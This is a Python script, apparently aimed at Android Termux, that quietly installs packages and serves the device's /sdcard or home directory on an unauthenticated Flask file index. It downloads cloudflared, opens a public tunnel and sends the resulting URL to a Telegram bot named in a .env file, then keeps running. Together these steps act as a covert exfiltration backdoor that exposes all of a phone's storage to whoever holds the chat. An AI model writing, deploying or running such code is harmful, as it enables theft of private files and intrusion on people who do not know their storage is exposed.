import os
import sys
import subprocess
import threading
import requests
import time
import shutil

def auto_pip_install(package, import_name=None):
    import_name = import_name or package
    while True:
        try:
            __import__(import_name)
            break
        except ImportError:
            # Try to install until it works
            subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '--quiet', package],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(1)

# Keep trying until all dependencies are available
auto_pip_install("flask")
auto_pip_install("flask-autoindex", import_name="flask_autoindex")
auto_pip_install("requests")

from flask import Flask
from flask_autoindex import AutoIndex

def load_env():
    env = {}
    if os.path.isfile(".env"):
        with open(".env") as f:
            for line in f:
                if "=" in line:
                    k, v = line.strip().split("=", 1)
                    env[k.strip()] = v.strip()
    return env

def send_to_tg(message):
    env = load_env()
    tg_token = env.get("TG_TOKEN", "")
    chat_id = env.get("CHAT_ID", "")
    if tg_token and chat_id:
        url = f"https://api.telegram.org/bot{tg_token}/sendMessage"
        try:
            requests.post(url, data={"chat_id": chat_id, "text": message})
        except Exception:
            pass

def run_flask_server(port=3000, serve_dir=None):
    app = Flask(__name__)
    AutoIndex(app, browse_root=serve_dir, add_url_rules=True)
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

def start_flask_background(port=3000, serve_dir=None):
    thread = threading.Thread(target=run_flask_server, args=(port, serve_dir), daemon=True)
    thread.start()
    time.sleep(2)

def is_cloudflared_installed():
    return shutil.which("cloudflared") is not None

def install_cloudflared():
    url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    local_path = "./cloudflared"
    try:
        r = requests.get(url, stream=True)
        with open(local_path, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        os.chmod(local_path, 0o755)
    except Exception:
        return False
    return True

def start_cloudflared(port=3000):
    cpath = shutil.which("cloudflared") or "./cloudflared"
    if not os.path.isfile(cpath):
        return None
    proc = subprocess.Popen(
        [cpath, "tunnel", "--url", f"http://localhost:{port}"],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    public_url = None
    for line in iter(proc.stdout.readline, ''):
        if "trycloudflare.com" in line:
            for word in line.split():
                if "https://" in word and "trycloudflare.com" in word:
                    public_url = word.strip()
                    break
        if public_url:
            break
    return public_url

def main():
    # Serve /sdcard if possible, else fallback to home directory
    serve_dir = "/data/data/com.termux/files/home" if os.path.exists("/data/data/com.termux/files/home") else os.path.expanduser("~")
    if os.path.exists("/sdcard") and os.access("/sdcard", os.R_OK):
        serve_dir = "/sdcard"
    start_flask_background(3000, serve_dir=serve_dir)
    if not is_cloudflared_installed() and not os.path.isfile("./cloudflared"):
        install_cloudflared()
    public_url = start_cloudflared(3000)
    if public_url:
        send_to_tg(f"Cloudflared public URL (Storage):\n{public_url}")
    while True:
        time.sleep(600)

if __name__ == "__main__":
    main()
